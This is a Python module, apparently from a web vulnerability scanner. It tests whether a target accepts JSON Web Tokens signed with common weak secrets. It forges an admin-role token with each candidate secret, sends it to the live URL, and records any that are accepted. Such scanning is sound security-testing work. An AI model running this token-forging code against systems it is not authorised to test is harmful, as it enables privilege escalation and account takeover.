"""JWT weak secret attack (moved from key_confusion for completeness)."""

import logging
from typing import Any

from ._helpers import (
    JWT_AUTH_HEADERS,
    WEAK_SECRETS,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def test_weak_secret(token: str, url: str, session) -> dict:
    """Test common weak JWT signing secrets."""
    result: dict[str, Any] = {"attack": "weak_secret", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        if not isinstance(header, dict):
            header = {"alg": "HS256", "typ": "JWT"}

        alg = header.get("alg", "HS256")
        if alg not in ("HS256", "HS384", "HS512", "RS256"):
            header["alg"] = "HS256"

        modified_payload = dict(payload)
        modified_payload["admin"] = True
        modified_payload["role"] = "admin"

        original_status = _get_original_status(url, session)

        for secret in WEAK_SECRETS:
            weak_token = _create_jwt(header, modified_payload, secret=secret)

            for auth_header in JWT_AUTH_HEADERS:
                resp = _send_with_token(url, weak_token, auth_header, session)
                status = resp.get("status", 0)
                body = resp.get("body", "").lower()

                if status in (200, 302) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "secret_preview": secret[:20].decode()
                            if isinstance(secret, bytes)
                            else secret[:20],
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": "weak_secret_accepted",
                        }
                    )
                    break

                if status == 200 and "admin" in body:
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "secret_preview": secret[:20].decode()
                            if isinstance(secret, bytes)
                            else secret[:20],
                            "auth_header": auth_header,
                            "status_code": status,
                            "finding": "weak_secret_admin_reflection",
                        }
                    )
                    break

            if result["vulnerable"]:
                break

        logger.info("Weak secret test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("Weak secret test error on %s: %s", url, e)
    return result
